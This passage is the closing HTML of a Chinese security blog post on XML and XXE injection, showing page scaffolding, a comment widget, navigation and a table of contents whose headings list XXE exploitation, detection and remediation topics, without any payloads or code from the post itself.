          </li>
          <li class="post-copyright-link">
          <strong>Post link:  </strong>
          <a href="/2021/10/01/XML与XXE/" target="_blank" title="XML与XXE">https://xizhi-future.github.io/2021/10/01/XML与XXE/</a>
          </li>
          <li class="post-copyright-license">
            <strong>Copyright Notice:   </strong>
            All articles in this blog are licensed under <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
            unless stating additionally.
          </li>
         
        </ul>
<div>

      
      
        
	<div id="comment">
		<!-- 来必力City版安装代码 -->
		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTQ4MS82MDQ5">
		<script type="text/javascript">
		   (function(d, s) {
		       var j, e = d.getElementsByTagName(s)[0];

		       if (typeof LivereTower === 'function') { return; }

		       j = d.createElement(s);
		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
		       j.async = true;

		       e.parentNode.insertBefore(j, e);
		   })(document, 'script');
		</script>
		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
		</div>
		<!-- City版安装代码已完成 -->
	</div>



      
      
        
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E/" rel="tag">漏洞</a></li></ul>

      

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2021/10/01/CTF-Show-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          CTF Show---信息搜集
        
      </div>
    </a>
  
  
    <a href="/2021/06/24/NUCTF/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">NUCTF</div>
    </a>
  
</nav>

  
</article>

<!-- Table of Contents -->

  <aside id="toc-sidebar">
    <div id="toc" class="toc-article">
    <strong class="toc-title">Contents</strong>
    
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E3%80%81XML"><span class="nav-number">1.</span> <span class="nav-text">一、XML</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-1-%E7%AE%80%E4%BB%8B"><span class="nav-number">1.1.</span> <span class="nav-text">1.1 简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-2-%E7%94%A8%E9%80%94"><span class="nav-number">1.2.</span> <span class="nav-text">1.2 用途</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-3-%E8%A7%84%E5%88%99"><span class="nav-number">1.3.</span> <span class="nav-text">1.3 规则</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-4-PCDATA"><span class="nav-number">1.4.</span> <span class="nav-text">1.4 PCDATA</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-5-CDATA"><span class="nav-number">1.5.</span> <span class="nav-text">1.5 CDATA</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-6-XML-%E5%B1%9E%E6%80%A7-%E4%B8%8E-%E5%85%83%E7%B4%A0"><span class="nav-number">1.6.</span> <span class="nav-text">1.6 XML 属性 与 元素</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-7-XML%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E7%9A%84%E6%98%BE%E7%A4%BA"><span class="nav-number">1.7.</span> <span class="nav-text">1.7 XML在浏览器中的显示</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-8-XML-%E7%9A%84%E8%A7%A3%E6%9E%90"><span class="nav-number">1.8.</span> <span class="nav-text">1.8 XML 的解析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-8-1-PHP-XML-DOM"><span class="nav-number">1.8.1.</span> <span class="nav-text">1.8.1 PHP XML DOM</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-9-%E6%96%87%E6%A1%A3%E7%BB%93%E6%9E%84-%E2%80%94-%E6%A0%91%E7%BB%93%E6%9E%84"><span class="nav-number">1.9.</span> <span class="nav-text">1.9 文档结构 — 树结构</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-9-1-XML%E5%A3%B0%E6%98%8E"><span class="nav-number">1.9.1.</span> <span class="nav-text">1.9.1 XML声明</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-9-2-DTD%E6%96%87%E6%A1%A3%E7%B1%BB%E5%9E%8B%E5%AE%9A%E4%B9%89%EF%BC%88%E5%8F%AF%E9%80%89%EF%BC%89"><span class="nav-number">1.9.2.</span> <span class="nav-text">1.9.2 DTD文档类型定义（可选）</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C%E3%80%81DTD"><span class="nav-number">2.</span> <span class="nav-text">二、DTD</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2-1-%E5%85%83%E7%B4%A0%E5%A3%B0%E6%98%8E"><span class="nav-number">2.1.</span> <span class="nav-text">2.1 元素声明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-2-%E5%B1%9E%E6%80%A7%E5%A3%B0%E6%98%8E"><span class="nav-number">2.2.</span> <span class="nav-text">2.2 属性声明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-3-%E5%AE%9E%E4%BD%93"><span class="nav-number">2.3.</span> <span class="nav-text">2.3 实体</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-1-%E6%99%AE%E9%80%9A%E5%AE%9E%E4%BD%93"><span class="nav-number">2.3.1.</span> <span class="nav-text">2.3.1 普通实体</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-2-%E5%8F%82%E6%95%B0%E5%AE%9E%E4%BD%93"><span class="nav-number">2.3.2.</span> <span class="nav-text">2.3.2 参数实体</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%89%E3%80%81XXE"><span class="nav-number">3.</span> <span class="nav-text">三、XXE</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#3-1-%E5%88%A9%E7%94%A8"><span class="nav-number">3.1.</span> <span class="nav-text">3.1 利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-1-%E6%9C%89%E5%9B%9E%E6%98%BE"><span class="nav-number">3.1.1.</span> <span class="nav-text">3.1.1 有回显</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%EF%BC%9A"><span class="nav-number">3.1.1.1.</span> <span class="nav-text">测试：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#php%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">3.1.1.2.</span> <span class="nav-text">php伪协议</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-2-%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="nav-number">3.1.2.</span> <span class="nav-text">3.1.2 无回显</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95"><span class="nav-number">3.1.2.1.</span> <span class="nav-text">测试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#HTTP-%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B-%E2%80%93-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">3.1.2.2.</span> <span class="nav-text">HTTP 内网主机探测 – 端口扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#RCE-PHP-expect%E6%A8%A1%E5%9D%97%E5%BC%80%E5%90%AF"><span class="nav-number">3.1.2.3.</span> <span class="nav-text">RCE : PHP expect模块开启</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Dos%E6%94%BB%E5%87%BB"><span class="nav-number">3.1.2.4.</span> <span class="nav-text">Dos攻击</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-3-Pikachu"><span class="nav-number">3.1.3.</span> <span class="nav-text">3.1.3 Pikachu</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-4-xxe-lab"><span class="nav-number">3.1.4.</span> <span class="nav-text">3.1.4 xxe-lab</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-5-xlsx-%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB"><span class="nav-number">3.1.5.</span> <span class="nav-text">3.1.5 xlsx 文件攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-2-%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="nav-number">3.2.</span> <span class="nav-text">3.2 绕过方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-3-%E6%A3%80%E6%B5%8B"><span class="nav-number">3.3.</span> <span class="nav-text">3.3 检测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-4-%E5%B7%A5%E5%85%B7"><span class="nav-number">3.4.</span> <span class="nav-text">3.4 工具</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-5-%E7%BB%83%E9%A2%98"><span class="nav-number">3.5.</span> <span class="nav-text">3.5 练题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-5-1-CTF-show"><span class="nav-number">3.5.1.</span> <span class="nav-text">3.5.1 CTF show</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-5-2-%E4%BF%AE%E6%94%B9-Content-Type%E7%B1%BB%E5%9E%8B"><span class="nav-number">3.5.2.</span> <span class="nav-text">3.5.2 修改 Content-Type类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-5-3-%E5%BC%95%E5%85%A5%E6%9C%AC%E5%9C%B0-dtd-%E6%96%87%E4%BB%B6"><span class="nav-number">3.5.3.</span> <span class="nav-text">3.5.3  引入本地 dtd 文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-5-4-Vulnhub"><span class="nav-number">3.5.4.</span> <span class="nav-text">3.5.4 Vulnhub</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-6-%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="nav-number">3.6.</span> <span class="nav-text">3.6 修复建议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-7-%E5%8F%82%E8%80%83"><span class="nav-number">3.7.</span> <span class="nav-text">3.7 参考</span></a></li></ol></li></ol>
    
    </div>
  </aside>

</section>
        
      </div>
      
      <footer id="footer">
  

  <div class="container">
      	<div class="row">
	      <p> Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/iTimeTraveler/hexo-theme-hiker" target="_blank">Hexo-theme-hiker</a> </p>
	      <p id="copyRightEn">Copyright &copy; 2013 - 2021 忆 执 昔 来 的 旅 途 All Rights Reserved.</p>
	      
	      
    		<p class="busuanzi_uv">
				UV : <span id="busuanzi_value_site_uv"></span> |  
				PV : <span id="busuanzi_value_site_pv"></span>
		    </p>
  		   
		</div>

		
  </div>
</footer>


<!-- min height -->

<script>
    var wrapdiv = document.getElementById("wrap");
    var contentdiv = document.getElementById("content");
    var allheader = document.getElementById("allheader");

    wrapdiv.style.minHeight = document.body.offsetHeight + "px";
    if (allheader != null) {
      contentdiv.style.minHeight = document.body.offsetHeight - allheader.offsetHeight - document.getElementById("footer").offsetHeight + "px";
    } else {
      contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("footer").offsetHeight + "px";
    }
</script>
    </div>
    <!-- <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
    <a href="/categories" class="mobile-nav-link">Categories</a>
  
    <a href="/tags" class="mobile-nav-link">Tags</a>
  
    <a href="/about" class="mobile-nav-link">About</a>
  
</nav> -->
    

<!-- mathjax config similar to math.stackexchange -->

<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/scripts.js"></script>





  
<script src="/js/dialog.js"></script>









	<div style="display: none;">
    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
  </div>



	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
	</script>






  </div>

  <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="display: none;">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <h2 class="modal-title" id="myModalLabel">设置</h2>
      </div>
      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">


      <div class="modal-body">
          <div style="margin:6px;">
            <a data-toggle="collapse" data-parent="#accordion" href="#collapseOne" onclick="javascript:setFontSize();" aria-expanded="true" aria-controls="collapseOne">
              正文字号大小
            </a>
          </div>
          <div id="collapseOne" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingOne">
          <div class="panel-body">
            您已调整页面字体大小
          </div>
        </div>
      


          <div style="margin:6px;">
            <a data-toggle="collapse" data-parent="#accordion" href="#collapseTwo" onclick="javascript:setBackground();" aria-expanded="true" aria-controls="collapseTwo">
              夜间护眼模式
            </a>
        </div>
          <div id="collapseTwo" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingTwo">
          <div class="panel-body">
            夜间模式已经开启，再次单击按钮即可关闭 
          </div>
        </div>

        <div>
            <a data-toggle="collapse" data-parent="#accordion" href="#collapseThree" aria-expanded="true" aria-controls="collapseThree">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关 于&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
        </div>
         <div id="collapseThree" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingThree">
          <div class="panel-body">
            忆 执 昔 来 的 旅 途
          </div>
          <div class="panel-body">
            Copyright © 2021 xizhi-future All Rights Reserved.
          </div>
        </div>
      </div>


      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
      <div class="modal-footer">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
      </div>
    </div>
  </div>
</div>
  
  <a id="rocket" href="#top" class=""></a>
  <script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
  
    <a id="menu-switch"><i class="fa fa-bars fa-lg"></i></a>
  
</body>
</html>